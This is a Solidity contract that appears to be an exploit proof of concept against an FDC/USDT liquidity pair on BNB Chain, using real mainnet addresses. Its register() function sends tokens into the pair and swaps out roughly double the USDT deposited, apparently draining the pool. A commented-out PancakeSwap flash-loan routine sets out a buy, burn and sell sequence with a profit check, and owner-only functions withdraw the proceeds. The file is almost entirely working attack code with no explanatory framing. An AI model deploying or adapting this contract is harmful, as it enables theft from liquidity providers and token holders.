//SPDX-License-Identifier: None
pragma solidity ^0.8.20;

import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "forge-std/console.sol";

import "@interfaces/IUniswapV2Router.sol";
import "@interfaces/IUniswapV3PoolActions.sol";
import "@interfaces/IPancakeV3FlashCallback.sol";

contract Bot is OwnableUpgradeable, IPancakeV3FlashCallback {
    IUniswapV3PoolActions private USDT_WBNB_POOL = IUniswapV3PoolActions(0x172fcD41E0913e95784454622d1c3724f546f849);

    IUniswapV2Router private constant UNISWAP_ROUTER = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    IUniswapV2Pair private constant USDT_FDC_PAIR = IUniswapV2Pair(0x45D675Ff71FC8A08d27F631E99Af2AceD1d48903);

    ERC20 private constant USDT = ERC20(0x55d398326f99059fF775485246999027B3197955);
    ERC20 private constant FDC = ERC20(0xf0788dB035F1AEBF5E653f0692e72C0d34F9860C);

    function initialize() public initializer {
        __Ownable_init(msg.sender);
    }

    receive() external payable {}

    function withdrawERC20(address erc20, address to) public onlyOwner {
        IERC20(erc20).transfer(to, IERC20(erc20).balanceOf(address(this)));
    }

    function withdrawETH(address payable to) public onlyOwner {
        to.transfer(address(this).balance);
    }

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        address recipient
    ) public {
        IERC20(tokenIn).approve(address(UNISWAP_ROUTER), amountIn);
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        UNISWAP_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 0, path, recipient, block.timestamp
        );
        IERC20(tokenIn).approve(address(UNISWAP_ROUTER), 0);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256, bytes calldata data) external {
        // uint256 borrowAmount = abi.decode(data, (uint256));

        // console.log("Before buy");
        // console.log("Pool USDT balance =>", USDT.balanceOf(address(USDT_FDC_PAIR)) / 1 ether);
        // console.log("Pool FDC balance =>", FDC.balanceOf(address(USDT_FDC_PAIR)) / 1 ether);
        // console.log();

        // swapExactTokensForTokensSupportingFeeOnTransferTokens(
        //     address(USDT), address(FDC), USDT.balanceOf(address(this)), address(this)
        // );

        // console.log("After buy");
        // console.log("Before burn");
        // console.log("Pool USDT balance =>", USDT.balanceOf(address(USDT_FDC_PAIR)) / 1 ether);
        // console.log("Pool FDC balance =>", FDC.balanceOf(address(USDT_FDC_PAIR)) / 1 ether);
        // console.log("Bot USDT balance =>", USDT.balanceOf(address(this)) / 1 ether);
        // console.log("Bot FDC balance =>", FDC.balanceOf(address(this)) / 1 ether);
        // console.log();

        // console.log("After burn");
        // console.log("Before sell");
        // console.log("Pool USDT balance =>", USDT.balanceOf(address(USDT_FDC_PAIR)) / 1 ether);
        // console.log("Pool FDC balance =>", FDC.balanceOf(address(USDT_FDC_PAIR)) / 1 ether);
        // console.log("Bot USDT balance =>", USDT.balanceOf(address(this)) / 1 ether);
        // console.log("Bot FDC balance =>", FDC.balanceOf(address(this)) / 1 ether);
        // console.log();

        // swapExactTokensForTokensSupportingFeeOnTransferTokens(
        //     address(FDC), address(USDT), FDC.balanceOf(address(this)), address(this)
        // );

        // console.log("After sell");
        // console.log("Pool USDT balance =>", USDT.balanceOf(address(USDT_FDC_PAIR)) / 1 ether);
        // console.log("Pool FDC balance =>", FDC.balanceOf(address(USDT_FDC_PAIR)) / 1 ether);
        // console.log("Bot USDT balance =>", USDT.balanceOf(address(this)) / 1 ether);
        // console.log("Bot FDC balance =>", FDC.balanceOf(address(this)) / 1 ether);
        // console.log();

        // require(USDT.balanceOf(address(this)) > borrowAmount + fee0, "No profit");

        // USDT.transfer(address(USDT_WBNB_POOL), borrowAmount + fee0);
    }

    // function main(uint256 flashLoanAmount, address withdrawAddress) public onlyOwner {
    //     flashLoanAmount = flashLoanAmount * 1 ether;

    //     bytes memory params = abi.encode(flashLoanAmount);

    //     USDT_WBNB_POOL.flash(address(this), flashLoanAmount, 0, params);

    //     USDT.transfer(withdrawAddress, USDT.balanceOf(address(this)));

    //     console.log("Profit =>", (USDT.balanceOf(withdrawAddress)) / 1 ether);
    //     console.log();
    // }

    function approve() public onlyOwner {
        USDT.approve(address(UNISWAP_ROUTER), type(uint256).max);
        FDC.approve(address(UNISWAP_ROUTER), type(uint256).max);
        USDT.approve(address(USDT_FDC_PAIR), type(uint256).max);
        FDC.approve(address(USDT_FDC_PAIR), type(uint256).max);
    }

    function register(address withdrawAddress) public {
        console.log("tx.origin =>", tx.origin);
        console.log("msg.sender =>", msg.sender);
        console.log("address(this) =>", address(this));

        console.log("Before USDT balance =>", USDT.balanceOf(address(this)) / 1 ether);

        uint256 usdtAmount;
        (uint256 usdtReserve, uint256 fdcReserve,) = USDT_FDC_PAIR.getReserves();
        uint256 fdcAmount = FDC.balanceOf(address(this));

        {
            uint256 addPoolRate = 5;
            uint256 minUsdtAmount = usdtReserve + (fdcAmount * usdtReserve * (100 - addPoolRate)) / (fdcReserve * 100);
            usdtAmount = minUsdtAmount - usdtReserve;
        }

        console.log("USDT amount =>", usdtAmount / 1 ether);
        console.log("FDC amount =>", fdcAmount / 1 ether);

        USDT.transfer(address(USDT_FDC_PAIR), usdtAmount);
        FDC.transfer(address(USDT_FDC_PAIR), fdcAmount);

        USDT_FDC_PAIR.swap(usdtAmount * 202 / 100, 0, address(this), new bytes(0));

        console.log("After USDT balance =>", USDT.balanceOf(address(this)) / 1 ether);
    }
}
